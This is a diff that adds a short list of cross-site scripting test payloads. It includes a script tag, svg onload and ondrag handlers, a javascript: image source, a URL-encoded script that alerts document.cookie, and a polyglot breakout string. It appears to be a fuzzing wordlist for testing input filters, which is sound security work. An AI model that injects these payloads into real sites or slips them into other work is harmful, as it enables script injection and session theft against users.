@@ -1,0 +1,8 @@
+eval('ale' + 'rt(0)');
+</svg>//["'`-->]]>]</div>
+<!DOCTYPE doc [
+"<IMG SRC=javascript:alert(""XSS"")>"
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+<svg><image href=validimage.png onload=alert(1)>
+<ruby draggable="true" ondrag="alert(1)">test</ruby>
+<script>alert(1)</script>
